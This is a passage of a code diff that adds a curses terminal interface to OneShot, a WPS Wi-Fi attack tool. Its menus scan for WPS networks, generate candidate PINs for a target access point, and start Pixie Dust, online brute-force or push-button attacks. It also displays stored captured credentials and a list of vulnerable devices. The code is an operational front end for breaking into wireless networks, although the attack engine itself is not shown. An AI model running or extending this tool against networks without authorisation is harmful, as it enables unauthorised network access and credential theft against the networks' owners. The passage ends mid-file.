+        self.mtk = False                    # --mtk-wifi
+        self.verbose = False                # -v
+        self.networks = {}
+        self.log_msgs = []
+        self.log_lock = threading.Lock()
+        self._scan_result = None
+        self.stdscr.nodelay(True)
+
+    def log(self, msg):
+        with self.log_lock:
+            self.log_msgs.append(msg)
+            if len(self.log_msgs) > 500: self.log_msgs = self.log_msgs[-500:]
+
+    # ==================== DRAWING ====================
+
+    def _draw_border_box(self, y, x, h, w, title=''):
+        for i in range(h):
+            self.stdscr.addch(y+i, x, '|')
+            self.stdscr.addch(y+i, x+w-1, '|')
+        self.stdscr.addch(y, 0, '+')
+        self.stdscr.addch(y, self.w-2, '+')
+        self.stdscr.addch(y+h-1, 0, '+')
+        self.stdscr.addch(y+h-1, self.w-2, '+')
+        self.stdscr.hline(y, 1, curses.ACS_HLINE, self.w-3)
+        self.stdscr.hline(y+h-1, 1, curses.ACS_HLINE, self.w-3)
+        if title:
+            self.stdscr.addstr(y, 2, ' ' + title + ' ', curses.color_pair(1) | curses.A_BOLD)
+
+    def refresh(self):
+        self.h, self.w = self.stdscr.getmaxyx()
+        self.stdscr.erase()
+        if self.h < 14 or self.w < 50:
+            self.stdscr.addstr(0, 0, "Terminal too small. Min 50x14")
+            self.stdscr.refresh()
+            return
+
+        # --- Header ---
+        title = " ONESHOT WPS v0.0.2 [Termux Full GUI] "
+        self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD | curses.A_REVERSE)
+        self.stdscr.addstr(0, max(0, (self.w - len(title)) // 2), title.center(self.w-2))
+        self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD | curses.A_REVERSE)
+
+        # --- Main Menu ---
+        y = 2
+        self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
+        self.stdscr.addstr(y, 2, " MAIN MENU ")
+        self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)
+
+        menu = [
+            "[1] Scan Networks     [2] Set BSSID        [3] Generate PINs",
+            "[4] Attack Mode       [5] START ATTACK     [6] STOP",
+            "[7] All Options       [8] View Saved       [9] Vuln List",
+            "[0] View Full Log     [R] Refresh          [Q] Quit",
+        ]
+        for i, m in enumerate(menu):
+            self.stdscr.addstr(y+1+i, 2, m)
+
+        # --- Status Bar ---
+        y_line = y + 5
+        mode_n = {'pixie':'Pixie','bruteforce':'Brute','pbc':'PBC'}
+
+        status_parts = [
+            ("IFace:", self.iface),
+            ("BSSID:", self.bssid or '(not set)'),
+            ("PIN:", self.pin or '(auto)'),
+            ("Mode:", mode_n.get(self.mode, self.mode)),
+        ]
+        status = ' | '.join('{} {}'.format(k, v) for k, v in status_parts)
+        self.stdscr.attron(curses.A_REVERSE)
+        self.stdscr.addstr(y_line, 1, ' ' + status.ljust(self.w-3) + ' ')
+        self.stdscr.attroff(curses.A_REVERSE)
+
+        # --- Networks ---
+        y_net = y_line + 2
+        if self.networks:
+            self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
+            self.stdscr.addstr(y_net, 2, " NETWORKS ({} found) ".format(len(self.networks)))
+            self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)
+            self.stdscr.addstr(y_net+1, 2, "{:<3} {:<18} {:<20} {:<8} {:<5} {}".format(
+                '#', 'BSSID', 'ESSID', 'Sec', 'PWR', 'Lock'))
+            items = list(self.networks.items())
+            if self.reverse: items = items[::-1]
+            max_show = min(len(items), self.h - y_net - 6)
+            for i, (n, net) in enumerate(items[:max_show]):
+                essid = (net.get('ESSID') or 'HIDDEN')[:18]
+                sec = net.get('Security type', '?')[:6]
+                pwr = str(net.get('Level', '?'))
+                lock = 'LOCK' if net.get('WPS locked') else ''
+                color = curses.color_pair(3) if lock else 0
+                self.stdscr.addstr(y_net+2+i, 2,
+                    "{:<3} {:<18} {:<20} {:<8} {:<5} {}".format(str(n), net['BSSID'], essid, sec, pwr, lock), color)
+
+        # --- Options summary ---
+        y_opt = self.h - 5
+        self.stdscr.attron(curses.color_pair(6))
+        self.stdscr.addstr(y_opt, 1, ' ' + '\u2500' * (self.w-3) + ' ')
+        self.stdscr.attroff(curses.color_pair(6))
+        opts = [
+            "Dly:{}".format(self.delay),
+            "Verb:{}".format('ON' if self.verbose else 'OFF'),
+            "Save:{}".format('ON' if self.save_res else 'OFF'),
+            "Force:{}".format('ON' if self.pixie_force else 'OFF'),
+            "ShowCmd:{}".format('ON' if self.show_cmd else 'OFF'),
+            "Loop:{}".format('ON' if self.loop else 'OFF'),
+            "Rev:{}".format('ON' if self.reverse else 'OFF'),
+            "MTK:{}".format(
+        'ON' if self.mtk else 'OFF'),
+            "IfaceDown:{}".format('ON' if self.iface_down else 'OFF'),
+        ]
+        opt_line = ' | '.join(opts)
+        self.stdscr.addstr(y_opt+1, 2, opt_line[:self.w-4])
+
+        # --- Log ---
+        log_h = self.h - y_opt - 3
+        log_y = y_opt + 2
+        if log_h > 1:
+            with self.log_lock:
+                lines = self.log_msgs[-(log_h-1):] if self.log_msgs else []
+            for i, msg in enumerate(lines):
+                if i >= log_h - 1: break
+                msg_s = msg[:self.w-4]
+                color = 0
+                if msg.startswith('[+]'): color = curses.color_pair(2)
+                elif msg.startswith('[-]') or msg.startswith('[!'): color = curses.color_pair(3)
+                elif msg.startswith('[*]'): color = curses.color_pair(6)
+                elif msg.startswith('[P]'): color = curses.color_pair(5)
+                self.stdscr.addstr(log_y+i, 2, msg_s, color)
+
+        # --- Running indicator ---
+        if self.running:
+            self.stdscr.attron(curses.color_pair(3) | curses.A_BOLD)
+            self.stdscr.addstr(0, self.w-12, " [RUNNING] ")
+            self.stdscr.attroff(curses.color_pair(3) | curses.A_BOLD)
+
+        self.stdscr.refresh()
+
+    # ==================== INPUT HELPERS ====================
+
+    def _get_input(self, y, x, prompt, maxlen=30, default=''):
+        self.stdscr.addstr(y, x, prompt, curses.color_pair(1) | curses.A_BOLD)
+        self.stdscr.addstr(y, x+len(prompt), str(default) + ' ' * (maxlen - len(str(default))))
+        self.stdscr.move(y, x+len(prompt))
+        self.stdscr.refresh()
+        curses.echo()
+        try:
+            s = self.stdscr.getstr(y, x+len(prompt), maxlen).decode('utf-8', errors='replace').strip()
+            curses.noecho()
+            return s if s else default
+        except:
+            curses.noecho()
+            return default
+
+    def _show_message(self, title, lines, wait=True):
+        self.stdscr.erase()
+        max_h = min(len(lines)+4, self.h-2)
+        y = (self.h - max_h) // 2
+        self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
+        self.stdscr.addstr(y, (self.w - len(title)) // 2, title)
+        self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)
+        y += 2
+        for i, line in enumerate(lines[:self.h-y-2]):
+            self.stdscr.addstr(y+i, 2, str(line)[:self.w-4])
+        if wait:
+            self.stdscr.addstr(self.h-2, 2, "Press any key to continue...")
+            self.stdscr.refresh()
+            self.stdscr.getch()
+
+    def _ask_yesno(self, y, x, prompt):
+        self.stdscr.addstr(y, x, prompt + " (y/N): ", curses.color_pair(4) | curses.A_BOLD)
+        self.stdscr.refresh()
+        curses.echo()
+        try:
+            s = self.stdscr.getstr(y, x+len(prompt)+7, 3).decode('utf-8', errors='replace').strip().lower()
+            curses.noecho()
+            return s == 'y'
+        except:
+            curses.noecho()
+            return False
+
+    # ==================== ACTIONS ====================
+
+    def _scan_networks(self):
+        if not self.iface: self.log("[!] Set Interface first"); return
+        self.log("[*] Scanning for WPS networks on {}...".format(self.iface))
+        def worker():
+            try:
+                s = WiFiScanner(self.iface, self.vuln_list)
+                nets = s.iw_scanner()
+                self._scan_result = nets
+                if nets: self.log("[+] Found {} WPS network(s)".format(len(nets)))
+                else: self.log("[-] No WPS networks found")
+            except Exception as e: self.log("[!] Scan error: {}".format(e))
+        threading.Thread(target=worker, daemon=True).start()
+
+    def _show_scan_select(self):
+        if self._scan_result:
+            self.networks = self._scan_result
+            self._scan_result = None
+        if not self.networks: self.log("[!] No networks. Scan first."); return
+
+        items = list(self.networks.items())
+        if self.reverse: items = items[::-1]
+
+        self.stdscr.erase()
+        y = 1
+        self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
+        self.stdscr.addstr(y, 2, " Select Network ")
+        self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD); y += 1
+        self.stdscr.addstr(y, 2, "{:<4} {:<18} {:<22} {:<8} {:<5} {:<}".format(
+            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'Device')); y += 1
+        for n, net in items:
+            essid = (net.get('ESSID') or 'HIDDEN')[:20]
+            sec = net['Security type'][:6]
+            pwr = str(net.get('Level', '?'))
+            dev = net.get('Device name', '')[:15]
+            self.stdscr.addstr(y, 2, "{:<4} {:<18} {:<22} {:<8} {:<5} {:<}".format(
+                str(n)+')', net['BSSID'], essid, sec, pwr, dev)); y += 1
+            if y > self.h - 4: break
+        self.stdscr.addstr(y+1, 2, "Enter # to select, or ENTER: ")
+        self.stdscr.refresh()
+        curses.echo()
+        try:
+            s = self.stdscr.getstr(y+1, 2, 5).decode('utf-8', errors='replace').strip()
+            if s and s.isdigit():
+                num = int(s)
+                if num in self.networks:
+                    self.bssid = self.networks[num]['BSSID']
+                    essid = self.networks[num].get('ESSID', 'HIDDEN')
+                    self.log("[+] Selected: {} ({})".format(self.bssid, essid))
+        except: pass
+        curses.noecho()
+
+    def _set_bssid(self):
+        b = self._get_input(1, 2, "Enter BSSID (MAC): ", 20, self.bssid)
+        if b: self.bssid = b.upper(); self.log("[+] BSSID: {}".format(self.bssid))
+
+    def _set_iface(self):
+        i = self._get_input(1, 2, "Enter Interface: ", 15, self.iface)
+        if i: self.iface = i; self.log("[+] Interface: {}".format(self.iface))
+
+    def _set_pin(self):
+        p = self._get_input(1, 2, "Enter WPS PIN (or leave empty for auto): ", 12, self.pin)
+        if p: self.pin = p; self.log("[+] PIN: {}".format(self.pin))
+        else: self.pin = ''; self.log("[i] PIN: auto")
+
+    def _show_pins(self):
+        if not self.bssid: self.log("[!] Set BSSID first"); return
+        pins = self.generator.getSuggested(self.bssid)
+        if not pins: pins = self.generator.getAll(self.bssid)
+        if not pins: self.log("[-] No PINs generated"); return
+
+        self.stdscr.erase()
+        y = 1
+        self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
+        self.stdscr.addstr(y, 2, " PINs for {} ".format(self.bssid))
+        self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD); y += 1
+        self.stdscr.addstr(y, 2, "{:<4} {:<10} {:<}".format('#', 'PIN', 'Algorithm')); y += 1
+        for i, p in enumerate(pins):
+            self.stdscr.addstr(y, 2, "{:<4} {:<10} {:<}".format(str(i+1)+')', p['pin'], p['name']))
+            y += 1
+            if y > self.h - 4: break
+        self.stdscr.addstr(y+1, 2, "Enter # to use PIN, or ENTER: ")
+        self.stdscr.refresh()
+        curses.echo()
+        try:
+            s = self.stdscr.getstr(y+1, 2, 5).decode('utf-8', errors='replace').strip()
+            if s and s.isdigit():
+                idx = int(s)-1
+                if 0 <= idx < len(pins): self.pin = pins[idx]['pin']; self.log("[+] Selected PIN: {}".format(self.pin))
+        except: pass
+        curses.noecho()
+
+    def _cycle_mode(self):
+        modes = ['pixie', 'bruteforce', 'pbc']
+        names = {'pixie':'Pixie Dust Attack (-K)', 'bruteforce':'Online Bruteforce (-B)', 'pbc':'Push Button Connect (--pbc)'}
+        try: idx = modes.index(self.mode)
+        except: idx = 0
+        self.mode = modes[(idx + 1) % len(modes)]
+        self.log("[i] Mode: {}".format(names.get(self.mode, self.mode)))
+
+    def _start_attack(self):
+        if not self.iface: self.log("[!] Interface required"); return
+        if self.mode != 'pbc' and not self.bssid: self.log("[!] BSSID required"); return
+        if self.running: self.log("[!] Already running"); return
+        if os.geteuid() != 0: self.log("[!] Run as root (sudo)"); return
+
+        if self.mtk:
+            try:
+                d = Path("/dev/wmtWifi")
+                if not d.is_char_device(): self.log("[!] /dev/wmtWifi not found"); return
+                d.chmod(0o644); d.write_text("1"); time.sleep(1)
+            except Exception as e: self.log("[!] MTK: {}".format(e)); return
+
+        if not iface_up(self.iface):
+            self.log('[!] Cannot bring up "{}"'.format(self.iface)); return
+
+        self.running = True
+        self.log("[*] === {} attack started ===".format(self.mode))
+        self.log("[*] {} | {}".format(self.iface, self.bssid or '(PBC)'))
+
+        def worker():
+            try:
+                delay = float(self.delay) if self.delay else None
+                comp = Companion(self.iface, save=self.save_res, debug=self.verbose, bssid=self.bssid, cb=self.log)
+                self.companion = comp
+                if self.mode == 'pixie':
+                    comp.single(self.bssid, pin=self.pin or None, pxm=True, sc=self.show_cmd, fr=self.pixie_force)
+                elif self.mode == 'bruteforce':
+                    comp.bf(self.bssid, self.pin or None, delay)
+                elif self.mode == 'pbc':
+                    comp.single(self.bssid, pbc=True)
+            except Exception as e: self.log("[!] Error: {}".format(e))
+            finally:
+                if self.companion:
+                    try: self.companion.cleanup()
+                    except: pass
+                    self.companion = None
+                self.running = False
+                if self.mtk:
+                    try: Path("/dev/wmtWifi").write_text("0")
+                    except: pass
+                self.log("[i] Attack finished")
+
+        threading.Thread(target=worker, daemon=True).start()
+
+    def _stop_attack(self):
+        if self.companion: self.companion.abort()
+        self.log("[!] Aborting...")
+        self.running = False
+
+    def _show_options(self):
+        running_opt = True
+        mode_names = {'pixie': 'Pixie Dust (-K)', 'bruteforce': 'Bruteforce (-B)', 'pbc': 'PBC (--pbc)'}
+        while running_opt:
+            self.stdscr.erase()
+            y = 1
+            self.stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
+            self.stdscr.addstr(y, 2, " ALL OPTIONS (CLI -> GUI Mapping) ")
+            self.stdscr.attroff(curses.color_pair(1) | curses.A_BOLD); y += 2
+
+            # CLI options mapped to GUI
+            opts = [
+                ("1", "-i --interface", self.iface, "Change interface name"),
+                ("2", "-b --bssid", self.bssid or '(not set)', "Set target BSSID"),
+                ("3", "-p --pin", self.pin or '(auto)', "Set WPS PIN"),
+                ("4", "Mode: -K / -B / --pbc", mode_names.get(self.mode, self.mode), "Cycle attack mode"),
+                ("5", "-d --delay", "{}s".format(self.delay), "Delay between attempts"),
+                ("6", "-v --verbose", "ON" if self.verbose else "OFF", "Verbose wpa_supplicant output"),
+                ("7", "-w --write", "ON" if self.save_res else "OFF", "Save credentials on success"),
+                ("8", "-F --pixie-force", "ON" if self.pixie_force else "OFF", "Pixiewps full range brute"),
+                ("9", "-X --show-pixie-cmd", "ON" if self.show_cmd else "OFF", "Show pixiewps command"),
+                ("a", "--vuln-list", "{} entries".format(len(self.vuln_list)), "Vulnerable devices list"),
+                ("b", "--iface-down", "ON" if self.iface_down else "OFF", "Down interface on exit"),
+                ("c", "-l --loop", "ON" if self.loop else "OFF", "Loop mode"),
+                ("d", "-r --reverse-scan", "ON" if self.reverse else "OFF", "Reverse scan order"),
+                ("e", "--mtk-wifi", "ON" if self.mtk else "OFF", "MediaTek WiFi driver"),
+            ]
+
+            for num, cli, val, desc in opts:
+                arrow = "\u25b6" if val == "ON" else " "
+                self.stdscr.addstr(y, 2, "[{}]".format(num), curses.color_pair(1) | curses.A_BOLD)
+                self.stdscr.addstr(y, 6, "{:<30}".format(cli))
+                self.stdscr.addstr(y, 37, val, curses.color_pair(2) if val == "ON" else curses.color_pair(3) if val == "OFF" else 0)
+                self.stdscr.addstr(y, 46, " - {}".format(desc))
+                y += 1
+
+            y += 1
+            self.stdscr.addstr(y, 2, "[ENTER] Back to main  |  Select option number to toggle/edit", curses.color_pair(4))
+            self.stdscr.refresh()
+
+            try:
+                k = self.stdscr.getch()
+                if k == 10 or k == 27 or k == ord('q'): running_opt = False
+                elif k == ord('1'): self._set_iface()
+                elif k == ord('2'): self._set_bssid()
+                elif k == ord('3'): self._set_pin()
+                elif k == ord('4'): self._cycle_mode()
+                elif k == ord('5'): self.delay = self._get_input(1, 2, "Delay (seconds): ", 5, self.delay)
+                elif k == ord('6'): self.verbose = not self.verbose
+                elif k == ord('7'): self.save_res = not self.save_res
+                elif k == ord('8'): self.pixie_force = not self.pixie_force
+                elif k == ord('9'): self.show_cmd = not self.show_cmd
+                elif k == ord('a'): self._load_custom_vuln()
+                elif k == ord('b'): self.iface_down = not self.iface_down
+                elif k == ord('c'): self.loop = not self.loop
+                elif k == ord('d'): self.reverse = not self.reverse
+                elif k == ord('e'): self.mtk = not self.mtk
+                elif k == ord('V'): self._view_vuln_list()
+            except: break
+        self.log("[i] Options saved")
+
+    def _load_custom_vuln(self):
+        self.stdscr.erase()
+        self.stdscr.addstr(2, 2, "Enter path to custom vuln list file: ", curses.color_pair(1) | curses.A_BOLD)
+        self.stdscr.refresh()
+        curses.echo()
+        try:
+            fp = self.stdscr.getstr(2, 42, 50).decode('utf-8', errors='replace').strip()
+            if fp and os.path.exists(fp):
+                with open(fp, encoding='utf-8') as f: self.vuln_list = f.read().splitlines()
+                self.log("[+] Loaded {} entries from {}".format(len(self.vuln_list), fp))
+            elif fp: self.log("[!] File not found: {}".format(fp))
+        except: pass
+        curses.noecho()
+
+    def _view_vuln_list(self):
+        if not self.vuln_list: self.log("[-] Vuln list is empty"); return
+        lines = ["Vulnerable Devices List ({} entries):".format(len(self.vuln_list))]
+        for i, v in enumerate(self.vuln_list):
+            lines.append("{}) {}".format(i+1, v))
+        self._show_message(" Vulnerable Devices List ", lines)
+
+    def _view_saved(self):
+        rf = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.txt'
+        if os.path.exists(rf):
+            with open(rf, encoding='utf-8') as f: data = f.read()
+            self._show_message(" Saved Credentials ", data.splitlines())
+        else: self.log("[i] No saved credentials found")
+
+    def _view_full_log(self):
+        with self.log_lock:
+            lines = list(self.log_msgs)
+        self._show_message(" Full Log ({} messages) ".format(len(lines)), lines if lines else ["(empty)"])
+
+    def _help_screen(self):
+        lines = [
+            "Oneshot WPS Tool v0.0.2 - Termux Full GUI",
+            "",
+            "=== CLI -> GUI Mapping ===",
+            "-i --interface          : Options [1] / main screen",
+            "-b --bssid              : Options [2] / scan & select",
+            "-p --pin                : Options [3] / Generate PINs [3]",
+            "-K --pixie-dust         : Attack Mode cycle [4]",
+            "-B --bruteforce         : Attack Mode cycle [4]",
+            "--pbc                   : Attack Mode cycle [4]",
+            "-d --delay              : Options [5]",
+            "-w --write              : Options [7]",
+            "-F --pixie-force        : Options [8]",
+            "-X --show-pixie-cmd     : Options [9]",
+            "--vuln-list             : Options [a] load custom file",
+            "--iface-down            : Options [b]",
+            "-l --loop               : Options [c]",
+            "-r --reverse-scan       : Options [d]",
+            "--mtk-wifi              : Options [e]",
+            "-v --verbose            : Options [6]",
+        ]
+        self._show_message(" Help / CLI Mapping ", lines)
+
+    # ==================== MAIN LOOP ====================
+
+    def run(self):
+        while True:
+            self.refresh()
+            try: k = self.stdscr.getch()
+            except: k = -1
+
+            # Handle scan results
+            if self._scan_result is not None: self._show_scan_select()
+
+            if k == -1: time.sleep(0.05); continue
+
+            if k == ord('q') or k == ord('Q'):
+                if self.running:
+                    if self._ask_yesno(self.h//2, 2, "Attack running. Quit?"): self._stop_attack(); break
+                    else: continue
+                break
+
+            if k == ord('1'): self._scan_networks()
+            elif k == ord('2'): self._set_bssid()
+            elif k == ord('3'): self._show_pins()
+            elif k == ord('4'): self._cycle_mode()
+            elif k == ord('5'): self._start_attack()
+            elif k == ord('6'): self._stop_attack()
+            elif k == ord('7'): self._show_options()
+            elif k == ord('8'): self._view_saved()
+            elif k == ord('9'): self._view_vuln_list()
+            elif k == ord('0'): self._view_full_log()
+            elif k == ord('r') or k == ord('R'): self.refresh()
+            elif k == ord('s') or k == ord('S'): self._show_scan_select()
+            elif k == ord('h') or k == ord('H'): self._help_screen()
+
+        # Cleanup
+        self.stdscr.erase()
+        self.stdscr.addstr(0, 0, "Cleaning up...")
+        self.stdscr.refresh()
+        if self.companion:
+            try: self.companion.cleanup()
+            except: pass
+        if self.mtk:
+            try: Path("/dev/wmtWifi").write_text("0")
+            except: pass
+        if self.iface_down: iface_up(self.iface, down=True)
+
+
 def main():
-    if sys.hexversion < 0x03060F0:
-        print("Python 3.6+ required"); sys.exit(1)
-    try:
-        curses.wrapper(lambda s: OneShotTUI(s).run())
-    except KeyboardInterrupt:
-        pass
-    print("\nOneShot TUI exited.")
+    if sys.hexversion < 0x03060F0: print("Python 3.6+ required"); sys.exit(1)
+    try: curses.wrapper(lambda s: OneShotTUI(s).run())
+    except KeyboardInterrupt: pass
+    print("\nOneShot Termux GUI exited.")
 
 
 if __name__ == '__main__':
